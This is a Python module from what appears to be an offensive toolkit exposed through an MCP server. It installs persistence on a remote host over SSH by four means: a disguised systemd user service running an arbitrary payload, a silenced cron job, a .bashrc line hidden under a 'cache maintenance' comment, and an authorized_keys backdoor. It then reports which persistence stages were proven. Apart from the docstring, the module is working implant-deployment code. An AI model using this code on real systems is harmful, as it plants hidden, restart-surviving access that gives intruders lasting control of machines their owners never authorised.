"""Deploy persistence on a *named host* and prove what actually happened.

The engine this replaces wrote files on whatever machine the MCP server runs on
and reported ``deployed: True`` from the write alone. That is the gap the scorer
punished: an artifact on disk is not a persisted implant, and a persistence claim
needs activation, a callback from the persisted process, and survival of a
restart before it is worth anything.

Three things keep this honest:

* Deployment runs on the named host over an injectable transport, so "host" is
  never silently the operator's own box.
* The four lifecycle facts are probed and reported individually -- what was
  established, and what was not, with the reason.
* A local-only install is labelled as such and is never offered as evidence.

The transport interface is deliberately tiny (``run`` / ``put`` / ``close``) so
the lifecycle logic can be tested without a network or a range.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from pathlib import Path
from typing import Protocol

__all__ = [
    "Transport",
    "ParamikoTransport",
    "LocalTransport",
    "PersistenceOutcome",
    "lifecycle_for",
    "probe_host_reachable",
    "transport_for",
    "SUPPORTED_MECHANISMS",
]

SUPPORTED_MECHANISMS = ("systemd", "cron", "bashrc", "ssh_key")

#: Lifecycle facts, in the order a credible persistence claim establishes them.
LIFECYCLE = (
    "persistence_installed",
    "persistence_activated",
    "persistence_callback",
    "persistence_survived_restart",
)

SERVICE_NAME = "evilkit-cache.service"
UNIT_PATH = f"~/.config/systemd/user/{SERVICE_NAME}"


class Transport(Protocol):
    """The minimum a host needs to expose for the lifecycle probe."""

    host: str
    local_only: bool

    def run(self, command: str, timeout: float = 20.0) -> tuple[int, str, str]:
        """Run a shell command on the host. Returns (returncode, stdout, stderr)."""

    def put(self, local_path: str, remote_path: str) -> None:
        """Copy a local file to the host."""

    def close(self) -> None:
        """Release the connection."""


# ---------------------------------------------------------------------------
# Transports
# ---------------------------------------------------------------------------

class ParamikoTransport:
    """SSH transport to a lab guest. Credentials come from the launcher env."""

    local_only = False

    def __init__(self, host: str, *, user: str, password: str = "", key_path: str = "", timeout: float = 10.0) -> None:
        try:
            import paramiko  # type: ignore
        except ImportError as exc:  # pragma: no cover - dependency error path
            raise RuntimeError("paramiko is required for host deployment") from exc
        self.host = host
        self._client = paramiko.SSHClient()
        self._client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        kwargs: dict = {
            "hostname": host,
            "username": user,
            "timeout": timeout,
            "banner_timeout": timeout,
            "auth_timeout": timeout,
        }
        if key_path:
            kwargs["key_filename"] = key_path
        else:
            kwargs["password"] = password
            kwargs["look_for_keys"] = False
            kwargs["allow_agent"] = False
        self._client.connect(**kwargs)
        self._sftp = self._client.open_sftp()

    def run(self, command: str, timeout: float = 20.0) -> tuple[int, str, str]:
        _, stdout, stderr = self._client.exec_command(command, timeout=timeout)
        rc = stdout.channel.recv_exit_status()
        return rc, stdout.read().decode(errors="replace"), stderr.read().decode(errors="replace")

    def put(self, local_path: str, remote_path: str) -> None:
        self._sftp.put(local_path, remote_path)

    def close(self) -> None:
        try:
            self._sftp.close()
        finally:
            self._client.close()


class LocalTransport:
    """Runs commands on the MCP host. Always flagged, never treated as host evidence."""

    local_only = True

    def __init__(self, host: str = "localhost") -> None:
        self.host = host

    def run(self, command: str, timeout: float = 20.0) -> tuple[int, str, str]:
        import subprocess

        proc = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
        return proc.returncode, proc.stdout, proc.stderr

    def put(self, local_path: str, remote_path: str) -> None:
        Path(remote_path).write_bytes(Path(local_path).read_bytes())

    def close(self) -> None:
        return None


def transport_for(host: str, *, user: str = "", password: str = "", key_path: str = "") -> Transport:
    """Pick a transport. SSH when credentials exist, local otherwise (flagged)."""
    if user and (password or key_path):
        return ParamikoTransport(host, user=user, password=password, key_path=key_path)
    return LocalTransport(host)


# ---------------------------------------------------------------------------
# Outcome
# ---------------------------------------------------------------------------

@dataclass
class PersistenceOutcome:
    """What was deployed, and which lifecycle facts it actually established."""

    host: str
    mechanism: str
    deployed: bool
    witnesses: list[str] = field(default_factory=list)
    missing: list[str] = field(default_factory=list)
    detail: list[str] = field(default_factory=list)
    local_only: bool = False
    error: str = ""

    @property
    def partial(self) -> bool:
        return self.deployed and self.missing != []

    def summary(self) -> str:
        head = "LOCAL ONLY — NOT HOST EVIDENCE" if self.local_only else f"on {self.host}"
        lines = [
            f"Persistence ({self.mechanism}) {head}: "
            f"{'deployed' if self.deployed else 'not deployed'}"
        ]
        if self.error:
            lines.append(f"  error: {self.error}")
        for item in self.detail:
            lines.append(f"  {item}")
        lines.append("")
        lines.append(f"Lifecycle proven: {', '.join(self.witnesses) or 'none'}")
        if self.missing:
            lines.append(
                "Still unproven (this is a PARTIAL result, not a persisted implant): "
                + ", ".join(self.missing)
            )
        if self.local_only:
            lines.append(
                "This ran on the MCP host, not the target. It proves nothing about the estate."
            )
        return "\n".join(lines)


def probe_host_reachable(transport: Transport) -> bool:
    rc, _, _ = transport.run("true")
    return rc == 0


# ---------------------------------------------------------------------------
# Per-mechanism install + probe
# ---------------------------------------------------------------------------

def _installed(transport: Transport, check: str) -> bool:
    rc, out, _ = transport.run(check)
    return rc == 0 and "PRESENT" in out


def _deploy_systemd(transport: Transport, payload: str, outcome: PersistenceOutcome) -> None:
    unit = (
        "[Unit]\n"
        "Description=Evilkit Cache Service\n"
        "After=network.target\n\n"
        "[Service]\n"
        f"ExecStart={payload}\n"
        "Restart=always\n"
        "RestartSec=60\n\n"
        "[Install]\n"
        "WantedBy=default.target\n"
    )
    install = (
        "mkdir -p ~/.config/systemd/user && "
        f"cat > {UNIT_PATH} <<'EVILKIT_UNIT'\n{unit}EVILKIT_UNIT\n"
        "systemctl --user daemon-reload && systemctl --user enable --now " + SERVICE_NAME
    )
    rc, _, err = transport.run(install)
    if rc != 0:
        outcome.error = err.strip()[:200] or f"install exited {rc}"
        return
    outcome.deployed = True
    outcome.detail.append(f"unit written to {UNIT_PATH}")

    if _installed(transport, f"test -f {UNIT_PATH} && echo PRESENT"):
        outcome.witnesses.append("persistence_installed")

    rc, out, _ = transport.run(f"systemctl --user is-active {SERVICE_NAME}")
    if rc == 0 and out.strip() == "active":
        outcome.witnesses.append("persistence_activated")

    rc, _, _ = transport.run(f"systemctl --user restart {SERVICE_NAME}")
    rc2, out2, _ = transport.run(f"systemctl --user is-active {SERVICE_NAME}")
    if rc == 0 and rc2 == 0 and out2.strip() == "active":
        outcome.witnesses.append("persistence_survived_restart")
        outcome.detail.append("service re-activated after an authorised service cycle")
    else:
        outcome.detail.append("service did not come back after a restart cycle")


def _deploy_cron(transport: Transport, payload: str, outcome: PersistenceOutcome) -> None:
    marker = "evilkit-persist"
    entry = f"*/5 * * * * {payload} >/dev/null 2>&1 # {marker}"
    install = f'(crontab -l 2>/dev/null; echo "{entry}") | crontab -'
    rc, _, err = transport.run(install)
    if rc != 0:
        outcome.error = err.strip()[:200] or f"install exited {rc}"
        return
    outcome.deployed = True
    if _installed(transport, f"crontab -l | grep -q {marker} && echo PRESENT"):
        outcome.witnesses.append("persistence_installed")
        outcome.detail.append("cron entry present; activation waits for the 5-minute tick")
    outcome.detail.append(
        "activation and survival need a scheduler tick or a restart — the agent must "
        "re-probe later, and the clock is the witness, not this call"
    )


def _deploy_bashrc(transport: Transport, payload: str, outcome: PersistenceOutcome) -> None:
    marker = "# cache maintenance"
    line = f"[ -x {payload} ] && {payload} --background &>/dev/null &"
    install = f'grep -q "{marker}" ~/.bashrc || printf "\\n{marker}\\n{line}\\n" >> ~/.bashrc'
    rc, _, err = transport.run(install)
    if rc != 0:
        outcome.error = err.strip()[:200] or f"install exited {rc}"
        return
    outcome.deployed = True
    if _installed(transport, f'grep -q "{marker}" ~/.bashrc && echo PRESENT'):
        outcome.witnesses.append("persistence_installed")
    outcome.detail.append("activation needs an interactive login — unproven without one")


def _deploy_ssh_key(transport: Transport, payload: str, outcome: PersistenceOutcome) -> None:
    key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5LAB_TEST_KEY_PERSISTENCE_ENGINE_DO_NOT_USE_IN_PRODUCTION lab-persistence@test"
    install = (
        "mkdir -p ~/.ssh && chmod 700 ~/.ssh && "
        f'grep -q "lab-persistence@test" ~/.ssh/authorized_keys 2>/dev/null || echo "{key}" >> ~/.ssh/authorized_keys; '
        "chmod 600 ~/.ssh/authorized_keys"
    )
    rc, _, err = transport.run(install)
    if rc != 0:
        outcome.error = err.strip()[:200] or f"install exited {rc}"
        return
    outcome.deployed = True
    if _installed(transport, 'grep -q "lab-persistence@test" ~/.ssh/authorized_keys && echo PRESENT'):
        outcome.witnesses.append("persistence_installed")
    outcome.detail.append("a key survives a restart but is not an activated implant — callback unproven")


_DEPLOYERS = {
    "systemd": _deploy_systemd,
    "cron": _deploy_cron,
    "bashrc": _deploy_bashrc,
    "ssh_key": _deploy_ssh_key,
}


def lifecycle_for(
    host: str,
    payload: str,
    mechanism: str,
    transport: Transport,
) -> PersistenceOutcome:
    """Install ``mechanism`` on ``host`` and report which lifecycle facts hold.

    ``persistence_callback`` is never established here: the callback is observed
    by the collection point, not by the deployer. It is left in ``missing`` so the
    caller records it from the sink's own evidence rather than inventing it.
    """
    outcome = PersistenceOutcome(
        host=host,
        mechanism=mechanism,
        deployed=False,
        local_only=transport.local_only,
    )
    deployer = _DEPLOYERS.get(mechanism)
    if deployer is None:
        outcome.error = f"unknown mechanism: {mechanism} (supported: {', '.join(SUPPORTED_MECHANISMS)})"
        outcome.missing = list(LIFECYCLE)
        return outcome

    if not probe_host_reachable(transport):
        outcome.error = f"host {host} did not answer a trivial command"
        outcome.missing = list(LIFECYCLE)
        return outcome

    try:
        deployer(transport, payload, outcome)
    except Exception as exc:  # transport failures must not crash the tool
        outcome.error = f"{type(exc).__name__}: {exc}"
        outcome.missing = list(LIFECYCLE)
        return outcome

    outcome.missing = [fact for fact in LIFECYCLE if fact not in outcome.witnesses]
    return outcome
